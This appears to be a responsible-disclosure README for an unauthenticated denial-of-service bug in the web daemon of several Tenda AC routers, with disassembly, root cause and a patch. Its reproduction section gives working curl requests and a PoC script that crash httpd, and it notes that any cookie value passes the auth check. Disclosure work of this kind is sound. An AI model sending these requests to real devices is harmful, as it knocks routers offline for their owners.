# Tenda AC Series — NULL Pointer Dereference in `formWifiWpsOOB` (CWE-476)

**Discovered by:** Xincheng Xu (徐新程, [@Xuan-crane](https://github.com/Xuan-crane)) and
Xingchi Chen (陈星池, [@Chauncy-lab](https://github.com/Chauncy-lab))

A remote denial-of-service vulnerability in the web management service (`bin/httpd`) of
multiple Tenda AC-series routers. A **single HTTP request** that omits the `index`
parameter causes `atoi(NULL)` to dereference address `0x0` and terminates the HTTP
daemon.

> **Status:** disclosed to the vendor and submitted to VulDB for CVE assignment.
> CVE ID: *pending*

---

## Affected Devices

All listed versions are the **latest firmware available from the vendor's own download
center** at the time of testing. Every entry below was **reproduced on a running QEMU
instance of the vendor's unmodified firmware** (see *Test environment* at the end) — none
is a static-only finding, and **none was validated on physical hardware**.

| Device | Firmware | Architecture | Status |
|---|---|---|---|
| Tenda AC6 | 15.03.05.19 | ARM | reproduced |
| Tenda AC9 v1.0 | 15.03.05.19 (6318) | ARM | reproduced (debugger-verified) |
| Tenda AC15 | 15.03.05.19 | ARM | reproduced |
| Tenda AC18 | 15.03.05.19 (6318) | ARM | reproduced |
| Tenda AC10U | 15.03.06.48 | MIPSEL | reproduced |

Notes on version currency:

- **AC6** `15.03.05.19` — verified byte-for-byte against the vendor's live download
  (SHA256 `621ce4ee…2372aa1b`, identical). Note that the AC6 v1.0 hardware also has
  `15.03.05.16` in circulation, referenced by other CVE records; **this report covers only
  the version the vendor currently distributes and makes no claim about `15.03.05.16`**
  (see `evidence/07-version-currency.md`).
- AC10U `15.03.06.48` was published by the vendor on **2026-07-13** with the release note
  *"fixed some vulnerabilities and improved system security"* — the defect is still
  present in that release as distributed.
- AC15 `15.03.05.19` (2017-05-27) supersedes `15.03.05.18` (2017-05-16); the newer
  build was downloaded from the vendor and tested.
- AC6 and AC15 are marked end-of-life by the vendor.
- The AC9 v3.0 hardware branch (`15.03.06.42`) was not available for testing.

---

## Reproduction

The shortest form — one request:

```bash
curl -s "http://192.168.0.1/goform/WifiWpsOOB" -H "Cookie: password=x"
```

Some firmware revisions answer with `302` on the first contact. In that case obtain the
server-issued cookie first:

```bash
COOKIE=$(curl -si "http://192.168.0.1/goform/WifiWpsOOB" \
         | grep -i '^set-cookie:' | head -1 \
         | cut -d' ' -f2 | cut -d';' -f1)

curl -s "http://192.168.0.1/goform/WifiWpsOOB" -H "Cookie: $COOKIE"
```

Or use the included script, which performs the baseline/trigger pair and reports the
result:

```bash
./poc.sh 192.168.0.1
```

**Expected result:** the connection is closed without any HTTP response, the `httpd`
process is gone, and all subsequent connections are refused until the device reboots.

### Trigger matrix (measured)

| Request | Result |
|---|---|
| `GET /goform/WifiWpsOOB` + any cookie | **crash** |
| `POST`, body empty | **crash** |
| `POST`, body without `index` (`foo=1`) | **crash** |
| `POST`, `index=` (empty value) | **crash** |
| `POST`, `index` (no `=`) | **crash** |
| `POST`, `index=1` | `200 OK` |
| `POST`, no cookie | `302` (auth gate, see below) |
| `POST`, `Content-Length` mismatch | no crash |

### Authentication

The auth gate only checks that a cookie named `password` **exists** — its value is never
validated. Any value is accepted, so the vulnerability requires no credentials:

```
Cookie: password=x     -> passes
Cookie: password=zzz   -> passes
(no cookie)            -> 302 redirect
```

---

## Root Cause

`formWifiWpsOOB` reads the request parameter `index` with a `NULL` default and passes the
result straight to `atoi()` without a `NULL` check. A `NULL` check *does* exist in the
function — but it is placed **after** the dereference.

```c
index = websGetVar(wp, "index", NULL);   /* returns NULL when the parameter is absent */
...
atoi(index);                             /* <-- first dereference; crashes here */
printf(...);                             /* the result is then used */
...
if (index == NULL) { /* error handling */ }   /* <-- check placed here, too late */
```

`atoi(NULL)` descends into the C library's `strtol`, whose character-scanning loop reads
a byte from address `0x0`:

```asm
; library: libuClibc  (atoi -> strtol -> _stdlib_strto_l_l)
0x3fdedaec:  mov   r6, r0        ; scan pointer := function argument
0x3fdedaf8:  add   r6, r6, #1
0x3fdedafc:  ldrb  r3, [r6]      ; <-- fault: read from address 0x0
0x3fdedb00:  ldr   r12, [r2]
0x3fdedb04:  lsl   r1, r3, #1
0x3fdedb08:  ldrh  r7, [r12, r1] ; 16-bit character-class lookup
```

In the device firmware (AC9 `bin/httpd`, ARM 32-bit, uClibc):

```asm
; index = websGetVar(wp, "index", NULL)
09b6b8  mov  r1, r3
09b6bc  mov  r2, #0            ; default = NULL
09b6c0  bl   0x9e0b8
09b6c4  str  r0, [fp, #-16]    ; save the index pointer

; atoi(index)                  <-- no guard of any kind
09b71c  ldr  r0, [fp, #-16]
09b720  bl   atoi@plt          ; crash site

; if (index == NULL) { ... }   <-- guard is 44 bytes later
09b748  ldr  r3, [fp, #-16]
09b74c  cmp  r3, #0
09b750  bne  0x9b7b4
```

Because the two sibling handlers `formWifiWpsStart` and `formWifiStatus` read a
parameter with **the same name** and guard it **correctly**, this is an omission rather
than a design decision:

```asm
; formWifiWpsStart (correct)
09a3e0  ldr  r3, [fp, #-24]
09a3e4  cmp  r3, #0            ; check first
09a3e8  bne  0x9a410
09a410  ldr  r0, [fp, #-24]
09a414  bl   atoi              ; reached only when non-NULL
```

---

## How This Differs From `CVE-2021-31627` and Friends

The same parameter of the same function has been assigned at least eight CVE IDs,
**all of them stack-based buffer overflows**. This finding is a **separate defect**:

| | Existing CVEs | This issue |
|---|---|---|
| Code | `sprintf(buf[24], "%s;%s", index, "1")` | `atoi(index)` where `index` may be `NULL` |
| CWE | CWE-121 (and 120/787/119) | **CWE-476** |
| Trigger | `index` **>= 22 bytes** | `index` **absent or empty** |
| Faulting instruction | in `httpd` itself (`0x9b85c`–`0x9b87c`), on function return | in libc `strtol` (`0x3fdedafc`), immediately |
| Response before dying | `200 OK` then crash | no response at all |
| Minimal PoC | 22+ byte value | one parameterless request |
| Relationship | **mutually exclusive** — supplying a value cannot trigger this bug; omitting it cannot trigger the overflow |

Uniqueness: across the whole AC9 `httpd` (205,838 instructions) there is **exactly one**
site where a getter with a `NULL` default is used as an argument without a preceding
`NULL` guard — this one. The two `websGetVar`-semantics helpers account for 511 call
sites in total, and all others are correctly guarded.

The scanning methodology was validated in both directions: the two sites the scanner
classified as *guarded* were tested on the emulated target and indeed do **not** crash.

---

## Impact

Remote denial of service. The web management daemon is the only administrative
interface; once it terminates the device cannot be configured over HTTP until it is
rebooted, and repeating the request keeps it down.

Based on a pure-availability, pre-authentication, low-complexity trigger:

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H   -> 7.5 (High)
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N
```

No code-execution claim is made: escalating a NULL dereference on ARM/MIPS would
require mapping address 0, which is not attainable here.

---

## Fix

```diff
  index = websGetVar(wp, "index", NULL);
+ if (index == NULL) {
+     /* handle the missing parameter */
+     return;
+ }
  idx = atoi(index);
```

or, minimally:

```diff
- index = websGetVar(wp, "index", NULL);
+ index = websGetVar(wp, "index", "");
```

---

## Evidence

Everything is reproducible from this repository:

| File | Contents |
|---|---|
| `evidence/01-disassembly.md` | Annotated disassembly of `formWifiWpsOOB` (AC9) |
| `evidence/02-gdb-crash.md` | Debugger capture: signal, registers, faulting instruction, fault address, caller identification |
| `evidence/03-strtol-crosscheck.md` | Cross-check of the crash site against the firmware's own uClibc |
| `evidence/04-trigger-matrix.md` | Full trigger matrix as measured |
| `evidence/05-uniqueness-scan.md` | Whole-binary scan for the same pattern |
| `evidence/06-per-model-verification.md` | Per-model reproduction records (QEMU user-mode) |
| `evidence/07-version-currency.md` | Affected version vs. vendor's current download center |

Test environment: QEMU user-mode emulation (`qemu-arm`, `qemu-mipsel-static`) using the
device vendor's own firmware images, plus a `gdb-multiarch` session attached through the
QEMU gdb stub. The crash was captured twice, independently, via separate POST and GET
triggers; the caller was confirmed by locating the `atoi` return address on the guest
stack.

### Screenshots

Captures of the live reproduction — for reviewers who prefer images over text:

| Image | Shows |
|---|---|
| `images/01-disassembly.png` | `formWifiWpsOOB` disassembly with the unguarded `atoi(index)` and the much later `cmp #0` highlighted |
| `images/02-gdb-crash.png` | Debugger stop: `SIGSEGV`, `pc=0x3fdedafc`, `r0=0`, `r6=0`, `ldrb r3,[r6]` |
| `images/03-fault-address.png` | `x/4xb $r6` → `Cannot access memory at address 0x0` |
| `images/04-caller-on-stack.png` | Stack dump containing `0x0009b724`, the return address of the `atoi` call |
| `images/05-trigger-ab.png` | Two-case run: `index` present → `200 OK` and alive; `index` absent → no response and the process gone |
| `images/06-all-models.png` | Per-model results table for all five devices |

How to regenerate each image is described in
[`docs/reproduce-and-screenshots.md`](docs/reproduce-and-screenshots.md).

---

## Timeline

| Date | Event |
|---|---|
| 2026-10-08 | Defect identified during a firmware review |
| 2026-10-09 | Root cause confirmed; call chain proven with a debugger |
| 2026-10-09 | All five models reproduced; version currency verified against the vendor |
| — | Vendor notified |
| — | Reported to VulDB (CVE pending) |

---

## Disclaimer

This repository is published for defensive and educational purposes, under responsible
disclosure. Do not use it against devices you do not own or are not authorised to test.

Released under the [MIT License](LICENSE).

---

## 中文摘要

腾达 AC 系列多款路由器的 Web 管理服务（`bin/httpd`）中，`formWifiWpsOOB` 函数读取
`index` 参数时默认值为 `NULL`，却在未做非空校验的情况下直接调用 `atoi()`，
导致解引用地址 `0x0` 并崩溃，造成**无需凭据的远程拒绝服务**。
该缺陷与同一参数上已编号的八条**栈溢出**类 CVE 是两处独立缺陷：本缺陷由**参数缺失**触发，
CWE 为 **476**。五个机型（含各机型官网当前最新固件）均已实测复现。
